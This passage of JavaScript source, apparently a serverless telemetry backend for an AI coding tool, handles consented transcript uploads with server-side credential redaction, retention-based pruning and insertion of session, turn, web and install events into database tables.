      WHERE event IN ('session_start', 'prompt_submitted', 'turn_end', 'session_end', 'session_crash')
        AND created_at >= datetime('now', '-1 day', 'start of day')
        AND created_at < datetime('now', 'start of day')
      GROUP BY date(created_at), telemetry_id
    `).run();
  } catch (err) {
    console.warn("daily activity repair failed", err?.message || err);
  }
}

async function ingestTranscript(request, env, cors) {
  if (!env.TRANSCRIPTS || typeof env.TRANSCRIPTS.put !== "function") {
    return jsonResponse({ error: "Transcript storage unavailable" }, 503, cors);
  }
  const declaredSize = Number(request.headers.get("content-length") || 0);
  if (declaredSize > MAX_TRANSCRIPT_BYTES) {
    return jsonResponse({ error: "Transcript payload too large" }, 413, cors);
  }

  let body;
  try {
    body = await request.json();
  } catch {
    return jsonResponse({ error: "Invalid JSON" }, 400, cors);
  }
  const problem = validateTranscript(body);
  if (problem) {
    return jsonResponse({ error: problem }, 400, cors);
  }

  // Defense in depth: clients redact before upload, but the public endpoint
  // must not trust callers to have done so. Preserve ordinary code and prose
  // while removing high-confidence credentials and sensitive object fields.
  redactSecretsInValue(body.messages);

  const encoded = JSON.stringify(body);
  const byteLength = new TextEncoder().encode(encoded).byteLength;
  if (byteLength > MAX_TRANSCRIPT_BYTES) {
    return jsonResponse({ error: "Transcript payload too large" }, 413, cors);
  }

  const month = new Date().toISOString().slice(0, 7);
  const objectKey = `transcripts/${month}/${body.upload_id}.json`;
  try {
    await env.TRANSCRIPTS.put(objectKey, encoded, {
      httpMetadata: { contentType: "application/json" },
      customMetadata: {
        consent_version: String(body.consent_version),
        telemetry_id: body.id,
      },
    });
    await env.DB.prepare(`
      INSERT INTO transcript_uploads (
        upload_id, telemetry_id, object_key, consent_version, schema_version,
        version, provider, model, end_reason, message_count, byte_count
      ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `).bind(
      body.upload_id,
      body.id,
      objectKey,
      body.consent_version,
      body.schema_version,
      body.version,
      body.provider || null,
      body.model || null,
      body.end_reason,
      body.message_count,
      byteLength,
    ).run();
  } catch (err) {
    try {
      await env.TRANSCRIPTS.delete(objectKey);
    } catch {
      // Best effort rollback. R2 lifecycle retention remains the safety net.
    }
    console.error("transcript upload failed", err?.message || err);
    return jsonResponse({ error: "Internal error" }, 500, cors);
  }
  return jsonResponse({ ok: true, upload_id: body.upload_id }, 200, cors);
}

function validateTranscript(body) {
  if (!body || body.event !== "transcript") return "Invalid transcript event";
  if (!UUID_RE.test(body.id || "") || !UUID_RE.test(body.upload_id || "")) {
    return "Invalid transcript identifier";
  }
  if (body.consent_version !== 1) return "Unsupported consent version";
  if (!Number.isInteger(body.schema_version) || body.schema_version < 1) {
    return "Invalid schema version";
  }
  if (typeof body.version !== "string" || !body.version) return "Missing version";
  if (!Array.isArray(body.messages) || body.messages.length === 0) {
    return "Transcript messages must be a non-empty array";
  }
  if (!Number.isInteger(body.message_count) || body.message_count !== body.messages.length) {
    return "Transcript message count mismatch";
  }
  if (!["normal_exit", "user_exit", "error", "unknown", "superseded"].includes(body.end_reason)) {
    return "Invalid transcript end reason";
  }
  return null;
}

const SENSITIVE_KEY_RE = /^(?:authorization|cookie|setcookie|privatekey|clientsecret)$/;

function isSensitiveKey(key) {
  const normalized = String(key).toLowerCase().replace(/[^a-z0-9]/g, "");
  return normalized.includes("apikey")
    || normalized.endsWith("token")
    || normalized.endsWith("secret")
    || normalized.includes("password")
    || SENSITIVE_KEY_RE.test(normalized);
}

function redactSecretText(text) {
  return text
    .replace(/sk-ant-(?:oat|ort)01-[A-Za-z0-9_-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/sk-or-v1-[A-Za-z0-9_-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/ghp_[A-Za-z0-9]{20,}/g, "[REDACTED_SECRET]")
    .replace(/github_pat_[A-Za-z0-9_]{20,}/g, "[REDACTED_SECRET]")
    .replace(/ya29\.[A-Za-z0-9._-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/AIza[0-9A-Za-z_-]{20,}/g, "[REDACTED_SECRET]")
    .replace(/xox[baprs]-[A-Za-z0-9-]{10,}/g, "[REDACTED_SECRET]")
    .replace(/AKIA[0-9A-Z]{16}/g, "[REDACTED_SECRET]")
    .replace(/Bearer\s+[A-Za-z0-9._~+/=-]{20,}/gi, "Bearer [REDACTED_SECRET]")
    .replace(/eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}/g, "[REDACTED_SECRET]")
    .replace(/-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----[\s\S]*?-----END (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g, "[REDACTED_SECRET]")
    .replace(/^\s*([A-Z][A-Z0-9_]*(?:API_KEY|TOKEN|SECRET|PASSWORD|COOKIE)\s*=\s*)[^\r\n]+/gim, "$1[REDACTED_SECRET]")
    .replace(/^\s*(AUTHORIZATION\s*[:=]\s*)[^\r\n]+/gim, "$1[REDACTED_SECRET]");
}

function redactSecretsInValue(value) {
  if (Array.isArray(value)) {
    for (let index = 0; index < value.length; index += 1) {
      if (typeof value[index] === "string") value[index] = redactSecretText(value[index]);
      else redactSecretsInValue(value[index]);
    }
    return;
  }
  if (!value || typeof value !== "object") return;
  for (const [key, entry] of Object.entries(value)) {
    if (isSensitiveKey(key)) {
      value[key] = "[REDACTED_SECRET]";
    } else if (typeof entry === "string") {
      value[key] = redactSecretText(entry);
    } else {
      redactSecretsInValue(entry);
    }
  }
}

function observeDbSize(result) {
  const size = result?.meta?.size_after;
  if (typeof size === "number" && size > 0) {
    lastObservedDbSizeBytes = size;
  }
  return lastObservedDbSizeBytes;
}

function isDbFullError(err) {
  const message = String(err?.message || err || "").toLowerCase();
  // D1 surfaces the cap as SQLITE_FULL ("database or disk is full") or an
  // explicit size-limit message. Keep this narrow: a false positive triggers
  // an unnecessary (rate-limited) prune, but matching e.g. "LIMIT" in SQL
  // syntax errors would prune on every malformed query.
  return (
    message.includes("sqlite_full")
    || message.includes("disk is full")
    || message.includes("database is full")
    || message.includes("exceeds the maximum size")
    || message.includes("maximum database size")
  );
}

function maybeScheduleEmergencyPrune(env, ctx) {
  if (lastObservedDbSizeBytes < D1_SOFT_LIMIT_BYTES) {
    return;
  }
  const now = Date.now();
  if (now - lastEmergencyPruneAtMs < EMERGENCY_PRUNE_COOLDOWN_MS) {
    return;
  }
  lastEmergencyPruneAtMs = now;
  if (ctx && typeof ctx.waitUntil === "function") {
    ctx.waitUntil(emergencyPrune(env));
  }
}

async function emergencyPrune(env) {
  console.error(
    `EMERGENCY PRUNE: db size ${lastObservedDbSizeBytes} bytes >= soft limit ${D1_SOFT_LIMIT_BYTES}; pruning with halved retention windows`,
  );
  await pruneOldEvents(env, { retentionScale: 0.5, maxBatches: 24 });
}

// Retention windows, in days, per event type. Children (turn_details /
// session_details) are deleted before their parent events rows to satisfy the
// FOREIGN KEY (event_id) constraints.
//
// Rationale:
// - turn_end / session_start / onboarding_step are the high-volume rows that
//   filled the database; their aggregate signal is captured in the
//   daily_active_users rollup at insert time.
// - session_end / session_crash power the headline "total users" and crash
//   metrics; keep them for 12 months per the documented retention policy.
// - install and feedback rows are tiny and act as identity/product anchors;
//   they are never pruned here.
// - web_pageview is the high-volume website row; keep a 90-day raw tail in D1
//   (matching firehose retention) and prune beyond it. web_cta_click is the
//   low-volume conversion anchor; keep 12 months. Web vitals need only a
//   30-day performance window; classified web errors remain useful for 90 days.
// - subscription_activated and account_linked are identity/revenue anchors and
//   are never pruned (like install / feedback).
const RETENTION_DAYS = {
  turn_end: 30,
  session_start: 30,
  onboarding_step: 30,
  upgrade: 60,
  auth_success: 180,
  session_end: 365,
  session_crash: 365,
  session_concurrency: 365,
  web_pageview: 90,
  web_cta_click: 365,
  web_vital: 30,
  web_error: 90,
  install_funnel: 90,
  subscription_login: 180,
  subscription_router_error: 90,
  subscription_budget_exhausted: 365,
  todo_session: 365,
  prompt_submitted: 30,
  telemetry_opt_out: 365,
  desktop_update: 365,
};

const PRUNE_BATCH_LIMIT = 10000;
const PRUNE_MAX_BATCHES_PER_RUN = 12;

async function pruneOldEvents(env, options = {}) {
  const retentionScale = options.retentionScale ?? 1;
  const maxBatches = options.maxBatches ?? PRUNE_MAX_BATCHES_PER_RUN;
  const linkageDays = Math.max(1, Math.round(90 * retentionScale));
  const linkageCutoff = `-${linkageDays} days`;
  // The conversion key is deliberately short-lived. Keep the aggregate CTA and
  // install anchors, but sever the browser <-> CLI join after 90 days.
  for (const table of ["web_details", "install_details"]) {
    try {
      await env.DB.prepare(
        `UPDATE ${table} SET conversion_id = NULL WHERE conversion_id IS NOT NULL
         AND event_id IN (
           SELECT event_id FROM events
           WHERE created_at < datetime('now', ?) AND event_id IS NOT NULL
         )`
      ).bind(linkageCutoff).run();
    } catch (err) {
      console.warn(`${table} attribution redaction failed`, err?.message || err);
    }
  }
  let batchesUsed = 0;
  for (const [eventType, days] of Object.entries(RETENTION_DAYS)) {
    const scaledDays = Math.max(1, Math.round(days * retentionScale));
    const cutoff = `-${scaledDays} days`;
    while (batchesUsed < maxBatches) {
      // Delete web_details children first (own try/catch: databases that
      // predate migration 0016 have no web_details table, and that must not
      // abort pruning of the event rows themselves).
      if (WEB_EVENTS.includes(eventType)) {
        try {
          await env.DB.prepare(
            `DELETE FROM web_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn(`web_details prune failed for ${eventType}`, err?.message || err);
        }
      }
      if (INSTALL_FUNNEL_EVENTS.includes(eventType)) {
        try {
          await env.DB.prepare(
            `DELETE FROM install_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn(`install_details prune failed for ${eventType}`, err?.message || err);
        }
      }
      if (eventType === "desktop_update") {
        try {
          await env.DB.prepare(
            `DELETE FROM desktop_update_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn(`desktop_update_details prune failed`, err?.message || err);
        }
      }
      if (eventType === "todo_session") {
        try {
          await env.DB.prepare(
            `DELETE FROM todo_session_details WHERE event_id IN (
               SELECT event_id FROM events
               WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
               LIMIT ?)`
          ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        } catch (err) {
          console.warn("todo_session_details prune failed", err?.message || err);
        }
      }
      try {
        // Delete detail children first so the events FK never blocks the prune.
        await env.DB.prepare(
          `DELETE FROM turn_details WHERE event_id IN (
             SELECT event_id FROM events
             WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
             LIMIT ?)`
        ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        await env.DB.prepare(
          `DELETE FROM session_details WHERE event_id IN (
             SELECT event_id FROM events
             WHERE event = ? AND created_at < datetime('now', ?) AND event_id IS NOT NULL
             LIMIT ?)`
        ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        const result = await env.DB.prepare(
          `DELETE FROM events WHERE id IN (
             SELECT id FROM events
             WHERE event = ? AND created_at < datetime('now', ?)
             LIMIT ?)`
        ).bind(eventType, cutoff, PRUNE_BATCH_LIMIT).run();
        if (!env.DB_MAIN) observeDbSize(result);
        const changes = result?.meta?.changes ?? result?.changes ?? 0;
        // Empty event families must not consume the deletion budget, or adding
        // a family permanently starves later families of retention checks.
        if (changes > 0) batchesUsed += 1;
        if (changes < PRUNE_BATCH_LIMIT) {
          break;
        }
      } catch (err) {
        console.warn(`retention prune failed for ${eventType}`, err?.message || err);
        break;
      }
    }
  }
}

async function insertConcurrencyDetails(env, body) {
  if (typeof body.event_id !== "string" || !body.event_id) return false;
  try {
    // Also run on event retries: a previous parent insert can have succeeded
    // while this detail write failed. INSERT OR IGNORE never rewrites history.
    await insertDynamic(env, "concurrency_details", concurrencyEntries(body));
    return true;
  } catch (err) {
    // A missing migration or failed detail write must not discard a valid
    // parent event. Coverage exposes missing_detail and the response exposes
    // concurrency_durable:false. Do not cache table absence across migrations.
    console.warn("concurrency detail write failed", err?.message || err);
    return false;
  }
}

async function insertEvent(env, body) {
  // usage_report is high volume (one per provider response). It is kept in
  // the firehose for per-session detail and rolled up here; no raw events row.
  if (body.event === "usage_report") {
    await recordDailyModelUsage(env, body);
    // Receipt insert and rollup trigger commit together. Ancillary country
    // writes cannot turn a committed usage receipt into a failed ACK.
    return;
  }

  const columns = await getEventColumns(env);
  const sessionDetailColumns = await getSessionDetailColumns(env);
  const turnDetailColumns = await getTurnDetailColumns(env);
  const installDetailColumns = await getInstallDetailColumns(env);
  const common = commonEventEntries(body, columns);

  if (body.event === "session_concurrency") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id], ["event", body.event], ["version", body.version],
      ["os", body.os], ["arch", body.arch], ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "todo_session") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertTodoSessionDetails(env, body, await getTodoSessionDetailColumns(env));
    }
    return;
  }

  if (body.event === "discovery") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertDiscoveryDetails(env, body, await getDiscoveryDetailColumns(env));
    }
    return;
  }

  if (WEB_EVENTS.includes(body.event)) {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertWebDetails(env, body, await getWebDetailColumns(env));
    }
    return;
  }

  if (SUBSCRIPTION_EVENTS.includes(body.event)) {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["account_id", body.account_id || null],
      ["tier", body.tier || null],
      // Subscription events reuse the generic model_start column for the
      // routed model (new event types; no historical rows are re-read).
      ["model_start", body.model || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "install_funnel") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertInstallDetails(env, body, installDetailColumns);
    }
    return;
  }

  if (body.event === "install") {
    const inserted = await insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ...common,
    ].filter(([name]) => columns.has(name)));
    if (inserted && body.conversion_id) {
      await insertInstallDetails(env, {
        ...body,
        stage: "first_run",
        outcome: "success",
        source: "cli",
      }, installDetailColumns);
    }
    return;
  }

  if (body.event === "upgrade") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["from_version", body.from_version || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (DESKTOP_EVENTS.includes(body.event)) {
    const inserted = await insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["from_version", body.event === "desktop_active" ? null : desktopToken(body.from_version, /[^0-9A-Za-z.+_-]/g)],
      ...common,
    ].filter(([name]) => columns.has(name)));
    if (inserted && body.event === "desktop_update" && body.event_id) {
      try {
        await insertDynamic(env, "desktop_update_details", [
          ["event_id", body.event_id],
          ["install_kind", desktopToken(body.install_kind)],
          ["update_outcome", desktopToken(body.update_outcome)],
          ["update_failure_stage", desktopToken(body.update_failure_stage)],
        ]);
      } catch (err) {
        console.warn("desktop_update_details insert failed", err?.message || err);
      }
    }
    return inserted;
  }

  if (body.event === "auth_success") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["auth_provider", body.auth_provider || null],
      ["auth_method", body.auth_method || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "onboarding_step") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["step", body.step || null],
      ["auth_provider", body.auth_provider || null],
      ["auth_method", body.auth_method || null],
      ["auth_failure_reason", body.auth_failure_reason || null],
      ["milestone_elapsed_ms", body.milestone_elapsed_ms || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "telemetry_opt_out") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["step", body.step || "telemetry_settings"],
      ...common.filter(([name]) => name !== "session_id"),
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "feedback") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["feedback_rating", body.feedback_rating || null],
      ["feedback_reason", body.feedback_reason || null],
      ["feedback_text", body.feedback_text || null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "session_start") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["provider_start", body.provider_start || null],
      ["model_start", body.model_start || null],
      ["session_start_hour_utc", body.session_start_hour_utc ?? null],
      ["session_start_weekday_utc", body.session_start_weekday_utc ?? null],
      ["previous_session_gap_secs", body.previous_session_gap_secs ?? null],
      ["sessions_started_24h", body.sessions_started_24h || 0],
      ["sessions_started_7d", body.sessions_started_7d || 0],
      ["active_sessions_at_start", rawConcurrencyScalar(body.active_sessions_at_start)],
      ["other_active_sessions_at_start", rawConcurrencyScalar(body.other_active_sessions_at_start)],
      ...common,
    ];
    if (columns.has("resumed_session")) {
      values.push(["resumed_session", boolToInt(body.resumed_session)]);
    }
    return insertEventRow(env, body, values.filter(([name]) => columns.has(name)));
  }

  if (body.event === "prompt_submitted") {
    return insertEventRow(env, body, [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["turn_index", body.turn_index ?? null],
      ...common,
    ].filter(([name]) => columns.has(name)));
  }

  if (body.event === "turn_end") {
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["turn_index", body.turn_index ?? null],
      ["turn_started_ms", body.turn_started_ms ?? null],
      ["turn_active_duration_ms", body.turn_active_duration_ms ?? null],
      ["idle_before_turn_ms", body.idle_before_turn_ms ?? null],
      ["idle_after_turn_ms", body.idle_after_turn_ms ?? null],
      ["input_tokens", body.input_tokens || 0],
      ["output_tokens", body.output_tokens || 0],
      ["cache_read_input_tokens", body.cache_read_input_tokens || 0],
      ["cache_creation_input_tokens", body.cache_creation_input_tokens || 0],
      ["total_tokens", body.total_tokens || 0],
      ["turn_success", boolToInt(body.turn_success)],
      ["turn_abandoned", boolToInt(body.turn_abandoned)],
      ["turn_end_reason", body.turn_end_reason || null],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertTurnDetails(env, body, turnDetailColumns);
    }
    return;
  }

  if (["session_end", "session_crash"].includes(body.event)) {
    const errors = body.errors || {};
    const values = [
      ["telemetry_id", body.id],
      ["event", body.event],
      ["version", body.version],
      ["os", body.os],
      ["arch", body.arch],
      ["provider_start", body.provider_start || null],
      ["provider_end", body.provider_end || null],
      ["model_start", body.model_start || null],
      ["model_end", body.model_end || null],
      ["provider_switches", body.provider_switches || 0],
      ["model_switches", body.model_switches || 0],
      ["duration_mins", body.duration_mins || 0],
      ["duration_secs", body.duration_secs || 0],
      ["turns", body.turns || 0],
      ["had_user_prompt", boolToInt(body.had_user_prompt)],
      ["had_assistant_response", boolToInt(body.had_assistant_response)],
      ["assistant_responses", body.assistant_responses || 0],
      ["first_assistant_response_ms", body.first_assistant_response_ms || null],
      ["first_tool_call_ms", body.first_tool_call_ms || null],
      ["first_tool_success_ms", body.first_tool_success_ms || null],
      ["tool_calls", body.tool_calls || 0],
      ["tool_failures", body.tool_failures || 0],
      ["executed_tool_calls", body.executed_tool_calls || 0],
      ["executed_tool_successes", body.executed_tool_successes || 0],
      ["executed_tool_failures", body.executed_tool_failures || 0],
      ["tool_latency_total_ms", body.tool_latency_total_ms || 0],
      ["tool_latency_max_ms", body.tool_latency_max_ms || 0],
      ["file_write_calls", body.file_write_calls || 0],
      ["tests_run", body.tests_run || 0],
      ["tests_passed", body.tests_passed || 0],
      ["input_tokens", body.input_tokens || 0],
      ["output_tokens", body.output_tokens || 0],
      ["cache_read_input_tokens", body.cache_read_input_tokens || 0],
      ["cache_creation_input_tokens", body.cache_creation_input_tokens || 0],
      ["total_tokens", body.total_tokens || 0],
      ["feature_memory_used", boolToInt(body.feature_memory_used)],
      ["feature_swarm_used", boolToInt(body.feature_swarm_used)],
      ["feature_web_used", boolToInt(body.feature_web_used)],
      ["feature_email_used", boolToInt(body.feature_email_used)],
      ["feature_mcp_used", boolToInt(body.feature_mcp_used)],
      ["feature_side_panel_used", boolToInt(body.feature_side_panel_used)],
      ["feature_goal_used", boolToInt(body.feature_goal_used)],
      ["feature_selfdev_used", boolToInt(body.feature_selfdev_used)],
      ["feature_background_used", boolToInt(body.feature_background_used)],
      ["feature_subagent_used", boolToInt(body.feature_subagent_used)],
      ["unique_mcp_servers", body.unique_mcp_servers || 0],
      ["session_success", boolToInt(body.session_success)],
      ["abandoned_before_response", boolToInt(body.abandoned_before_response)],
      ["session_stop_reason", body.session_stop_reason || null],
      ["agent_role", body.agent_role || null],
      ["parent_session_id", body.parent_session_id || null],
      ["agent_active_ms_total", body.agent_active_ms_total || 0],
      ["agent_model_ms_total", body.agent_model_ms_total || 0],
      ["agent_tool_ms_total", body.agent_tool_ms_total || 0],
      ["session_idle_ms_total", body.session_idle_ms_total || 0],
      ["agent_blocked_ms_total", body.agent_blocked_ms_total || 0],
      ["time_to_first_agent_action_ms", body.time_to_first_agent_action_ms ?? null],
      ["time_to_first_useful_action_ms", body.time_to_first_useful_action_ms ?? null],
      ["spawned_agent_count", body.spawned_agent_count || 0],
      ["background_task_count", body.background_task_count || 0],
      ["background_task_completed_count", body.background_task_completed_count || 0],
      ["subagent_task_count", body.subagent_task_count || 0],
      ["subagent_success_count", body.subagent_success_count || 0],
      ["swarm_task_count", body.swarm_task_count || 0],
      ["swarm_success_count", body.swarm_success_count || 0],
      ["user_cancelled_count", body.user_cancelled_count || 0],
      ["transport_https", body.transport_https || 0],
      ["transport_persistent_ws_fresh", body.transport_persistent_ws_fresh || 0],
      ["transport_persistent_ws_reuse", body.transport_persistent_ws_reuse || 0],
      ["transport_cli_subprocess", body.transport_cli_subprocess || 0],
      ["transport_native_http2", body.transport_native_http2 || 0],
      ["transport_other", body.transport_other || 0],
      ["session_start_hour_utc", body.session_start_hour_utc ?? null],
      ["session_start_weekday_utc", body.session_start_weekday_utc ?? null],
      ["session_end_hour_utc", body.session_end_hour_utc ?? null],
      ["session_end_weekday_utc", body.session_end_weekday_utc ?? null],
      ["previous_session_gap_secs", body.previous_session_gap_secs ?? null],
      ["sessions_started_24h", body.sessions_started_24h || 0],
      ["sessions_started_7d", body.sessions_started_7d || 0],
      ["active_sessions_at_start", rawConcurrencyScalar(body.active_sessions_at_start)],
      ["other_active_sessions_at_start", rawConcurrencyScalar(body.other_active_sessions_at_start)],
      ["max_concurrent_sessions", rawConcurrencyScalar(body.max_concurrent_sessions)],
      ["multi_sessioned", rawConcurrencyScalar(body.multi_sessioned)],
      ["resumed_session", boolToInt(body.resumed_session)],
      ["end_reason", body.end_reason || null],
      ["error_provider_timeout", errors.provider_timeout || 0],
      ["error_auth_failed", errors.auth_failed || 0],
      ["error_tool_error", errors.tool_error || 0],
      ["error_mcp_error", errors.mcp_error || 0],
      ["error_rate_limited", errors.rate_limited || 0],
      ...common,
    ].filter(([name]) => columns.has(name));
    const inserted = await insertEventRow(env, body, values);
    if (inserted) {
      await insertSessionDetails(env, body, sessionDetailColumns);
    }
    return;
  }
}

async function insertEventRow(env, body, entries) {
  const result = await insertDynamic(env, "events", entries);
  const inserted = wasInserted(result);
  if (inserted) {
    await recordDailyActivity(env, body);
  }
  return inserted;
}

function wasInserted(result) {
  return (result?.meta?.changes ?? result?.changes ?? 0) > 0;
}

async function insertTurnDetails(env, body, columns) {
  if (!columns || columns.size === 0 || !body.event_id || !columns.has("event_id")) {
    return;
  }
  const values = [
    ["event_id", body.event_id],
    ["turn_index", body.turn_index ?? null],
    ["turn_started_ms", body.turn_started_ms ?? null],
    ["turn_active_duration_ms", body.turn_active_duration_ms ?? null],
    ["idle_before_turn_ms", body.idle_before_turn_ms ?? null],
    ["idle_after_turn_ms", body.idle_after_turn_ms ?? null],
    ["turn_success", boolToInt(body.turn_success)],
    ["turn_abandoned", boolToInt(body.turn_abandoned)],
    ["turn_end_reason", body.turn_end_reason || null],
    ["input_tokens", body.input_tokens || 0],
    ["output_tokens", body.output_tokens || 0],
    ["total_tokens", body.total_tokens || 0],
    ["assistant_responses", body.assistant_responses || 0],
    ["first_assistant_response_ms", body.first_assistant_response_ms ?? null],
    ["first_tool_call_ms", body.first_tool_call_ms ?? null],
    ["first_tool_success_ms", body.first_tool_success_ms ?? null],
    ["first_file_edit_ms", body.first_file_edit_ms ?? null],
    ["first_test_pass_ms", body.first_test_pass_ms ?? null],
    ["tool_calls", body.tool_calls || 0],
    ["tool_failures", body.tool_failures || 0],
    ["executed_tool_calls", body.executed_tool_calls || 0],
    ["executed_tool_successes", body.executed_tool_successes || 0],
    ["executed_tool_failures", body.executed_tool_failures || 0],
    ["tool_latency_total_ms", body.tool_latency_total_ms || 0],
    ["tool_latency_max_ms", body.tool_latency_max_ms || 0],
    ["file_write_calls", body.file_write_calls || 0],
    ["tests_run", body.tests_run || 0],
    ["tests_passed", body.tests_passed || 0],
    ["feature_memory_used", boolToInt(body.feature_memory_used)],
    ["feature_swarm_used", boolToInt(body.feature_swarm_used)],
    ["feature_web_used", boolToInt(body.feature_web_used)],
    ["feature_email_used", boolToInt(body.feature_email_used)],
    ["feature_mcp_used", boolToInt(body.feature_mcp_used)],
    ["feature_side_panel_used", boolToInt(body.feature_side_panel_used)],
    ["feature_goal_used", boolToInt(body.feature_goal_used)],
    ["feature_selfdev_used", boolToInt(body.feature_selfdev_used)],
    ["feature_background_used", boolToInt(body.feature_background_used)],
    ["feature_subagent_used", boolToInt(body.feature_subagent_used)],
    ["unique_mcp_servers", body.unique_mcp_servers || 0],
    ["tool_cat_read_search", body.tool_cat_read_search || 0],
    ["tool_cat_write", body.tool_cat_write || 0],
    ["tool_cat_shell", body.tool_cat_shell || 0],
    ["tool_cat_web", body.tool_cat_web || 0],
    ["tool_cat_memory", body.tool_cat_memory || 0],
    ["tool_cat_subagent", body.tool_cat_subagent || 0],
    ["tool_cat_swarm", body.tool_cat_swarm || 0],
    ["tool_cat_email", body.tool_cat_email || 0],
    ["tool_cat_side_panel", body.tool_cat_side_panel || 0],
    ["tool_cat_goal", body.tool_cat_goal || 0],
    ["tool_cat_mcp", body.tool_cat_mcp || 0],
    ["tool_cat_other", body.tool_cat_other || 0],
    ["tool_cat_todo", body.tool_cat_todo || 0],
    ["feature_todo_used", boolToInt(body.feature_todo_used)],
    ["todo_gate_ownership_count", body.todo_gate_ownership_count || 0],
    ["todo_gate_hill_count", body.todo_gate_hill_count || 0],
    ["todo_gate_completion_count", body.todo_gate_completion_count || 0],
    ["todo_gate_spike_count", body.todo_gate_spike_count || 0],
    ["workflow_chat_only", boolToInt(body.workflow_chat_only)],
    ["workflow_coding_used", boolToInt(body.workflow_coding_used)],
    ["workflow_research_used", boolToInt(body.workflow_research_used)],
    ["workflow_tests_used", boolToInt(body.workflow_tests_used)],
    ["workflow_background_used", boolToInt(body.workflow_background_used)],
    ["workflow_subagent_used", boolToInt(body.workflow_subagent_used)],
    ["workflow_swarm_used", boolToInt(body.workflow_swarm_used)],
  ].filter(([name]) => columns.has(name));
  if (values.length > 1) {
    await insertDynamic(env, 'turn_details', values);
  }
}

async function recordDailyActivity(env, body) {
  // Country rollup covers every event family, including the ones that never
  // reach the DAU table (install, upgrade, web_pageview, ...).
  await recordCountryDaily(env, body);
  if (!["session_start", "prompt_submitted", "turn_end", "session_end", "session_crash"].includes(body.event)) {
    return;
  }

  const activityDate = new Date().toISOString().slice(0, 10);
  const meaningful = isMeaningfulLifecycleEvent(body) ? 1 : 0;
  // ci_release means the artifact was built by CI/CD, not that this execution
  // happened on a runner. Runtime automation is represented independently by
  // is_ci and CI-built official binaries still count as release usage.
  const release = ["release", "ci_release"].includes(body.build_channel) ? 1 : 0;
  const meaningfulRelease = meaningful && release ? 1 : 0;
